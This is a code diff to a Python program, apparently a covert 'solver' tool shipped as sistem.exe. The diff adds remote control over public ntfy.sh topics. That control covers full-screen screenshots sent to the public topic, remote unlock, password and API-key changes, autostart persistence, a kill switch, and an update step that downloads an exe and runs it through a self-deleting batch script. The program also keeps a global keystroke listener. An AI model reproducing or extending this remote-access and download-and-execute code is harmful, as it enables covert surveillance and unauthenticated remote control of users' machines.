@@ -509,10 +509,12 @@ class AssistantState:
         self.error_cursor_active = False
         self.error_cursor_id    = 0
 
-        # Password unlock (solver locked until correct password)
-        self.solver_password     = config_data.get("solver_password", "")
+        # Password unlock (supports multiple comma-separated passwords)
+        raw_pwds = config_data.get("solver_password", "")
+        self.solver_password     = raw_pwds
+        self.solver_passwords    = [p.strip().lower() for p in str(raw_pwds).split(",") if p.strip()]
         self.solver_unlocked     = False
-        self.key_listener_active = False
+        self.key_listener_active = bool(self.solver_passwords)
         self.key_buffer          = ""
         self.auto_lock_timer     = None
         self.unlocked_at         = 0.0
@@ -593,57 +595,41 @@ def delete_api_key(index):
         return True, f"API Key #{index} deleted/cleared."
 
 
-# ─── TELEGRAM ─────────────────────────────────────────────────────────────────
-TG_SESSION = requests.Session()
-try:
-    _adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
-    TG_SESSION.mount("https://", _adapter)
-except Exception:
-    pass
+# ─── WEB CONTROL PANEL TRANSPORT (ntfy.sh) ──────────────────────────────────
+WEB_CMD_TOPIC    = "mca_cmd_ch_77"
+WEB_STATUS_TOPIC = "mca_status_ch_77"
+
+def web_send_log(text, log_type="normal", pc_name=None):
+    def _worker():
+        try:
+            clean_text = re.sub(r'<[^>]+>', '', str(text)).strip()
+            payload = {
+                "type": "log",
+                "pc": pc_name or getattr(state, "pc_name", PC_NAME),
+                "text": clean_text,
+                "log_type": log_type,
+                "time": time.time()
+            }
+            requests.post(f"https://ntfy.sh/{WEB_STATUS_TOPIC}", json=payload, timeout=3.0)
+        except Exception:
+            pass
+    threading.Thread(target=_worker, daemon=True).start()
 
 def tg_send_message(text, parse_mode="HTML"):
-    def _worker():
-        token   = getattr(state, "tg_bot_token", TG_BOT_TOKEN)
-        chat_id = getattr(state, "tg_chat_id", TG_CHAT_ID)
-        if not token or not chat_id:
-            return
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        for attempt in range(3):
-            try:
-                payload = {"chat_id": chat_id, "text": text}
-                if parse_mode:
-                    payload["parse_mode"] = parse_mode
-                r = TG_SESSION.post(url, json=payload, timeout=5)
-                if r.status_code == 200:
-                    return
-                if r.status_code == 429:
-                    try:
-                        wait_s = float(r.json().get("parameters", {}).get("retry_after", 3))
-                    except Exception:
-                        wait_s = 3.0
-                    time.sleep(wait_s + random.uniform(0.1, 0.3))
-                    continue
-                if r.status_code != 200 and parse_mode:
-                    r2 = TG_SESSION.post(url, json={"chat_id": chat_id, "text": text}, timeout=5)
-                    if r2.status_code == 200:
-                        return
-                break
-            except Exception:
-                time.sleep(0.5)
-    threading.Thread(target=_worker, daemon=True).start()
+    web_send_log(text)
 
 def tg_send_photo(photo_bytes, caption="", parse_mode="HTML"):
     def _worker():
-        token   = getattr(state, "tg_bot_token", TG_BOT_TOKEN)
-        chat_id = getattr(state, "tg_chat_id", TG_CHAT_ID)
-        if not token or not chat_id:
-            return
-        url = f"https://api.telegram.org/bot{token}/sendPhoto"
         try:
-            TG_SESSION.post(url,
-                data={"chat_id": chat_id, "caption": caption, "parse_mode": parse_mode},
-                files={"photo": ("screenshot.png", io.BytesIO(photo_bytes), "image/png")},
-                timeout=10)
+            b64_img = base64.b64encode(photo_bytes).decode("ascii")
+            payload = {
+                "type": "screenshot",
+                "pc": getattr(state, "pc_name", PC_NAME),
+                "image": f"data:image/jpeg;base64,{b64_img}",
+                "caption": caption,
+                "time": time.time()
+            }
+            requests.post(f"https://ntfy.sh/{WEB_STATUS_TOPIC}", json=payload, timeout=6.0)
         except Exception:
             pass
     threading.Thread(target=_worker, daemon=True).start()
@@ -1703,8 +1689,12 @@ def start_auto_lock_timer(duration_seconds: float = 7200.0):
 def check_keystroke_for_pass(key_name: str):
     if not getattr(state, "key_listener_active", False) or getattr(state, "solver_unlocked", False):
         return
-    pwd = (getattr(state, "solver_password", "") or "").strip().lower()
-    if not pwd:
+    pwds = getattr(state, "solver_passwords", [])
+    if not pwds:
+        raw = (getattr(state, "solver_password", "") or "").strip().lower()
+        if raw:
+            pwds = [p.strip().lower() for p in raw.split(",") if p.strip()]
+    if not pwds:
         return
 
     if key_name == "backspace":
@@ -1720,20 +1710,20 @@ def check_keystroke_for_pass(key_name: str):
     state.key_buffer = (state.key_buffer + ch)[-60:]
     buf = state.key_buffer
 
-    pwd_alt = "".join(_LAYOUT_RU_EN.get(c, _LAYOUT_EN_RU.get(c, c)) for c in pwd)
-    if buf.endswith(pwd) or (pwd_alt and buf.endswith(pwd_alt)):
+    matched = False
+    for pwd in pwds:
+        pwd_alt = "".join(_LAYOUT_RU_EN.get(c, _LAYOUT_EN_RU.get(c, c)) for c in pwd)
+        if buf.endswith(pwd) or (pwd_alt and buf.endswith(pwd_alt)):
+            matched = True
+            break
+
+    if matched:
         state.solver_unlocked = True
         state.key_listener_active = False
         state.key_buffer = ""
         start_auto_lock_timer(7200.0)  # Auto-lock after 2 hours (7200 sec)
         log(f"Key listener: Passcode matched! Solver UNLOCKED on {state.pc_name}", "OK")
-        tg_send_message(
-            f"🎯 <b>КОД СОВПАЛ С КЛАВИАТУРЫ!</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🖥 <code>{state.pc_name}</code>\n"
-            f"✅ Солвер <b>РАЗБЛОКИРОВАН</b> на 2 часа! 🚀\n"
-            f"⏱ <i>Автоматическая блокировка сработает через 2 часа.</i>"
-        )
+        web_send_log(f"🎯 Пароль введен с клавиатуры! Солвер РАЗБЛОКИРОВАН на {state.pc_name} (на 2 часа)", "success")
 
 
 # ─── GLOBAL HOTKEY ────────────────────────────────────────────────────────────
@@ -2851,6 +2841,188 @@ def tg_bot_poller():
             time.sleep(1.0)
 
 
+# ─── WEB CONTROL PANEL LISTENER & HEARTBEAT ─────────────────────────────────
+def web_heartbeat_loop():
+    """Sends status heartbeat to web control panel every 3 seconds."""
+    while state.is_running:
+        try:
+            is_unlocked = bool(getattr(state, "solver_unlocked", False))
+            is_busy = bool(getattr(state, "busy", False))
+            status_text = "Busy" if is_busy else ("Ready" if is_unlocked else "Locked")
+            payload = {
+                "type": "heartbeat",
+                "pc": state.pc_name,
+                "status": status_text,
+                "unlocked": is_unlocked,
+                "busy": is_busy,
+                "mode": getattr(state, "mode", "SOLVER"),
+                "version": "v2.6.4",
+                "time": time.time()
+            }
+            requests.post(f"https://ntfy.sh/{WEB_STATUS_TOPIC}", json=payload, timeout=2.5)
+        except Exception:
+            pass
+        time.sleep(3.0)
+
+def web_control_poller():
+    """Listens for commands from Web Control Panel via ntfy.sh (No Telegram required)."""
+    log(f"Web Control listener started on {state.pc_name} (topic: {WEB_CMD_TOPIC})")
+    last_processed_time = time.time()
+
+    time.sleep(random.uniform(0.5, 1.2))
+    web_send_log(f"🟢 ПК {state.pc_name} подключился к Web-панели управления!", "success")
+
+    while state.is_running:
+        try:
+            r = requests.get(f"https://ntfy.sh/{WEB_CMD_TOPIC}/json?since=10s", timeout=25)
+            if r.status_code == 200:
+                for line in r.iter_lines():
+                    if not line:
+                        continue
+                    try:
+                        raw = json.loads(line.decode("utf-8"))
+                        msg_str = raw.get("message", "")
+                        if not msg_str:
+                            continue
+                        cmd = json.loads(msg_str) if isinstance(msg_str, str) else msg_str
+                    except Exception:
+                        continue
+
+                    cmd_time = cmd.get("time", 0) / 1000.0 if "time" in cmd else time.time()
+                    if cmd_time < last_processed_time - 2.0:
+                        continue
+
+                    target = cmd.get("target")
+                    if target and target.lower() not in ("все пк", "broadcast") and target.lower() != state.pc_name.lower():
+                        continue
+
+                    action = str(cmd.get("action", "")).lower()
+                    if not action:
+                        continue
+
+                    # 1. UNLOCK
+                    if action in ("unlock", "turn_on", "on"):
+                        cancel_auto_lock_timer()
+                        state.solver_unlocked = True
+                        state.key_listener_active = False
+                        state.key_buffer = ""
+                        start_auto_lock_timer(7200.0)
+                        web_send_log(f"🟢 Солвер ВКЛЮЧЕН на {state.pc_name} (разблокирован на 2 ч.)", "success")
+
+                    # 2. LOCK
+                    elif action in ("lock", "turn_off", "off"):
+                        cancel_auto_lock_timer()
+                        state.solver_unlocked = False
+                        state.key_listener_active = bool(getattr(state, "solver_passwords", []))
+                        state.key_buffer = ""
+                        state.unlocked_at = 0.0
+                        web_send_log(f"🔴 Солвер ВЫКЛЮЧЕН на {state.pc_name} (заблокирован)", "warn")
+
+                    # 3. PASSWORDS (comma-separated list)
+                    elif action in ("pass", "passwords", "set_passwords"):
+                        raw_pwds = cmd.get("passwords", [])
+                        if isinstance(raw_pwds, str):
+                            plist = [p.strip() for p in raw_pwds.split(",") if p.strip()]
+                        elif isinstance(raw_pwds, list):
+                            plist = [str(p).strip() for p in raw_pwds if str(p).strip()]
+                        else:
+                            plist = []
+                        if plist:
+                            state.solver_passwords = [p.lower() for p in plist]
+                            state.solver_password = ", ".join(plist)
+                            state.solver_unlocked = False
+                            state.key_listener_active = True
+                            state.key_buffer = ""
+                            cfg = load_config()
+                            cfg["solver_password"] = state.solver_password
+                            save_config(cfg)
+                            web_send_log(f"🔑 Установлены пароли: [{', '.join(plist)}] на {state.pc_name}. Солвер заблокирован.", "normal")
+
+                    # 4. SCREENSHOT
+                    elif action in ("screen", "screenshot"):
+                        def _take_and_send():
+                            try:
+                                img = ImageGrab.grab()
+                                if img.width > 1280:
+                                    ratio = 1280.0 / img.width
+                                    img = img.resize((1280, int(img.height * ratio)), Image.Resampling.LANCZOS)
+                                buf = io.BytesIO()
+                                img.save(buf, format="JPEG", quality=75)
+                                b64 = base64.b64encode(buf.getvalue()).decode("ascii")
+                                payload = {
+                                    "type": "screenshot",
+                                    "pc": state.pc_name,
+                                    "image": f"data:image/jpeg;base64,{b64}",
+                                    "time": time.time()
+                                }
+                                requests.post(f"https://ntfy.sh/{WEB_STATUS_TOPIC}", json=payload, timeout=8.0)
+                            except Exception as ex:
+                                web_send_log(f"⚠️ Ошибка скриншота на {state.pc_name}: {ex}", "danger")
+                        threading.Thread(target=_take_and_send, daemon=True).start()
+
+                    # 5. AUTOSTART
+                    elif action in ("autostart",):
+                        enable = bool(cmd.get("enable", True))
+                        if enable:
+                            setup_autostart(0)
+                        else:
+                            remove_autostart()
+                        status_str = "ВКЛЮЧЕН" if enable else "ОТКЛЮЧЕН"
+                        web_send_log(f"⚡ Автозапуск {status_str} на {state.pc_name}", "normal")
+
+                    # 6. KILL / DELETE
+                    elif action in ("kill", "delete"):
+                        web_send_log(f"🗑️ Экстренное завершение программы на {state.pc_name}...", "danger")
+                        time.sleep(0.5)
+                        remove_autostart()
+                        os._exit(0)
+
+                    # 7. UPDATE (OTA)
+                    elif action in ("update", "autoupdate"):
+                        def _do_update():
+                            web_send_log(f"🚀 Загрузка свежего sistem.exe на {state.pc_name}...", "normal")
+                            try:
+                                url = "https://mca.vercel.app/sistem.exe"
+                                r = requests.get(url, timeout=30)
+                                if r.status_code == 200 and len(r.content) > 1000000:
+                                    new_exe = os.path.join(BASE_DIR, "sistem_new.exe")
+                                    with open(new_exe, "wb") as f:
+                                        f.write(r.content)
+                                    updater_bat = os.path.join(BASE_DIR, "update.bat")
+                                    curr_exe = sys.executable if getattr(sys, "frozen", False) else os.path.join(BASE_DIR, "sistem.exe")
+                                    with open(updater_bat, "w") as f:
+                                        f.write(f"@echo off\ntimeout /t 2 /nobreak >nul\nmove /y \"{new_exe}\" \"{curr_exe}\"\nstart \"\" \"{curr_exe}\"\ndel \"%~f0\"\n")
+                                    web_send_log(f"✅ Обновление скачано на {state.pc_name}! Перезапуск...", "success")
+                                    subprocess.Popen(["cmd.exe", "/c", updater_bat], close_fds=True)
+                                    os._exit(0)
+                                else:
+                                    web_send_log(f"❌ Ошибка скачивания обновления на {state.pc_name}: HTTP {r.status_code}", "danger")
+                            except Exception as ex:
+                                web_send_log(f"❌ Сбой обновления на {state.pc_name}: {ex}", "danger")
+                        threading.Thread(target=_do_update, daemon=True).start()
+
+                    # 8. API KEYS
+                    elif action in ("keys", "api_keys"):
+                        new_keys = cmd.get("keys", [])
+                        if isinstance(new_keys, list) and new_keys:
+                            cfg = load_config()
+                            for i, k in enumerate(new_keys[:5], 1):
+                                if k:
+                                    setattr(state, f"api_key_{i}", k)
+                                    cfg[f"api_key_{i}"] = k
+                            save_config(cfg)
+                            web_send_log(f"💾 Обновлен пул API ключей на {state.pc_name}", "normal")
+
+                    # 9. PING
+                    elif action in ("ping",):
+                        pass
+
+            last_processed_time = time.time()
+        except Exception:
+            pass
+        time.sleep(2.0)
+
+
 # ─── MAIN ─────────────────────────────────────────────────────────────────────
 def main():
     if len(sys.argv) > 1:
@@ -2875,7 +3047,8 @@ def main():
     keyboard.hook(on_global_hotkey)
     threading.Thread(target=lan_peer_listener,  daemon=True).start()
     question_history_mgr.start_network_sync_listener()
-    threading.Thread(target=tg_bot_poller,     daemon=True).start()
+    threading.Thread(target=web_control_poller, daemon=True).start()
+    threading.Thread(target=web_heartbeat_loop, daemon=True).start()
     threading.Thread(target=log_watcher_thread, daemon=True).start()
 
     try:
